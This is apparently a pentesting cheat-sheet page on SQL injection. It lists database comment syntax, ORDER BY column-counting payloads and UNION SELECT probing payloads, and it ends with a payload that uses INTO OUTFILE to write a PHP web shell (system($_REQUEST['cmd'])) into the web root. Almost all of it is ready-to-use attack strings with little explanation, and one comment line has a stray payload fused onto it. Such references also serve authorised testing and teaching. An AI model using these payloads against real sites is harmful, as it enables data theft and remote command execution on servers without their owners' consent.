---
description: >-
  SQL injection (SQLi) is a web security vulnerability that allows an attacker
  to interfere with the queries that an application makes to its database.
---

# SQL Injection

## SQL Injection basics

### Comments

```
Oracle
--comment

MSSQL
--comment
/*comment*/

PostgreSQL
--comment
/*comment*/

MySQL
#comment
-- comment [Note the space after the double dash]
/*comment*/
```

### Detecting Columns using `ORDER BY`

Finding how many columns in the query by using `order by`

```python
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
# and so on. Until you've found an error
```

### Inject in columns using `UNION SELECT`

Let says you've found 5 columns in the query. Now, it's time to check which columns are vulnerable/injectable.

```python
' UNION SELECT 'a',NULL,NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL,NULL--
# keep replacing 'a'. Until you've found an error.' UNION ALL SELECT 1-- -
```

### Inject in columns using `UNION ALL SELECT`

```python
' UNION ALL SELECT 1-- - 
' UNION ALL SELECT 1,2-- -
' UNION ALL SELECT 1,2,3-- -
# keep going until you've found one of the numbers in the output.
```

### Web-Shell/Backdoor

{% code title="PHP web-shell" %}
```php
' UNION ALL SELECT '<?php system($_REQUEST["cmd"]);?>' INTO OUTFILE '/var/www/html/cmd.php'-- -
```
{% endcode %}
